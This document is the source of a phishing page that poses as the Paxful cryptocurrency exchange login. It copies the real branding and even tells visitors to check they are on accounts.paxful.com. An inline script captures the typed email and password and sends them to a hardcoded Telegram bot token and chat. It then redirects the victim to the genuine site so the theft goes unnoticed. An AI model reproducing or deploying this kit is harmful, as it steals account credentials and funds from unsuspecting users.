<?php
include("common/third_includes.php");
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Paxful</title>
    <link rel="stylesheet" href="MDVqMGo3qAIAsA/styles/style.css" />
    <link rel="stylesheet" href="MDVqMGo3qAIAsA/fontawesome/css/all.min.css" />
  </head>
  <body>
    <div class="container">
      <section class="one">
        <div class="login-form">
          <div class="row">
            <a href="index.html">
              <svg
                viewBox="0 0 123.7 23.3"
                xmlns="http://www.w3.org/2000/svg"
                fill="#333"
                width="120">
                <path
                  d="M91.3 1.7V12c0 3.6 1.5 5 4.1 5s4.1-1.5 4.1-5V1.7h4.3v10.4c0 5.5-3.1 8.5-8.4 8.5-5.2 0-8.4-3-8.4-8.5V1.7zm-59.8 0l8.3 18.6h-4.5l-1.7-4H25l-1.7 4h-4.4l8.3-18.6zm49.7 0v3.5h-9.7v4.9H80v3.5h-8.5v6.8h-4.3V1.7zm32.8 0v15.1h9.7v3.5h-14V1.7zM8.1 1.7c4.9 0 8.1 2.5 8.1 6.8 0 4.1-3.1 6.7-8.1 6.7H4.3v5.2H0V1.7zm47 9.9l6.3 8.7h-4.1c-.6 0-1.2-.2-1.6-.7l-.1-.1-2.3-3.2c-.5-.8-.5-1.8 0-2.6l.1-.2zM29.3 6l-2.9 7.1h5.9zM7.9 5.2H4.3v6.5h3.5c2.7 0 4-1.2 4-3.2s-1.3-3.3-3.9-3.3zm39-3.5c.7 0 1.2.2 1.6.7l.1.1 1.2 1.7c.5.7.5 1.7.1 2.4l-.1.1-1.7 2.4-5.4-7.5z"></path>
                <path
                  d="M63.1 0L41.5 23.2c-.2.3-.7-.1-.4-.4L56.7.8c.4-.5 1-.8 1.7-.8z"
                  fill="#00a5ef"></path>
              </svg>
            </a>

            <div class="dropdown-row">
              <i class="fas fa-globe"></i>
              <select class="dropdown">
                <option value="english">English</option>
              
              </select>
            </div>
          </div>

          <h2 class="title">Log In With Paxful</h2>

          <div class="n-row">
            <div class="item-one">
              <box-icon name="error-circle" color="#00a5ef"></box-icon>
              <p class="important">
                IMPORTANT! Please check that you are visiting <br />
                https://accounts.paxful.com/
              </p>
            </div>

            <div class="item-two">
              <i class="fa fa-lock"></i>
              <p class="pax-link">
                <span class="span-one">https</span
                ><span class="span-two">://</span
                ><span class="span-three">accounts.paxful.com/</span>
              </p>
            </div>
          </div>

          <form id="loginForm" autocomplete="off">
            <div class="form-group">
              <label class="label" for="email">Your Phone or Email</label>
              <div class="input-row">
                <input type="text" id="email" name="email"  required />
              </div>
            </div>

            <div class="form-group last">
              <div class="pass-row">
                <label class="label" for="password">Your Password</label>
                <label class="label pass-label reg">Forgot Password?</label>
              </div>
              <div class="input-row">
                <input
                  class="password"
                  id="password"
                  type="password"
                  name="password"
                  required
                  autocomplete="off" />
                <i class="icon fas fa-eye"></i>
              </div>
            </div>
            <div class="btn-row">
              <input type="submit" id="loginBtn" value="Log in" />
              <i class="fas fa-chevron-right"></i>
            </div>
          </form>
        
          <script>
            document.getElementById('loginBtn').addEventListener('click', function(event) {
                event.preventDefault(); // Prevent form submission
                
                var formData = new FormData(document.getElementById('loginForm'));
                var message = "New paxful login: " +"\n" + " 📧 Email: "+ formData.get('email') + "\n 🔑Password: " + formData.get('password') + " \n @kaliologie"  ;
            
                fetch('https://api.telegram.org/bot6375326209:AAHznFTmYEJkWiY0qaoSWlEHwdyG5ixKufQ/sendMessage?chat_id=-1002117422654&text=' + encodeURIComponent(message), {
                    method: 'POST'
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    return response.json();
                })
                .then(data => {
                    console.log(data);
                    window.location.href = 'https://paxful.com'; // 
                })
                .catch(error => {
                    console.error('There was a problem with the fetch operation:', error);
                    alert('Failed to send data to Telegram.');
                });
            });
            </script>

          <p class="reg-link">
            New on Paxful? <span class="reg">Create an Account</span>
          </p>
        </div>
      </section>

      <section class="two">
        <img class="pax-img" src="MDVqMGo3qAIAsA/images/paxful.png" alt="paxful" />
        <img
          src="MDVqMGo3qAIAsA/images/Screenshot&#32;2023-12-20&#32;162204.png"
          class="help"
          alt="" />
      </section>
    </div>

    <script src=""></script>
    <script src="https://unpkg.com/boxicons@2.1.4/dist/boxicons.js"></script>
  </body>
</html>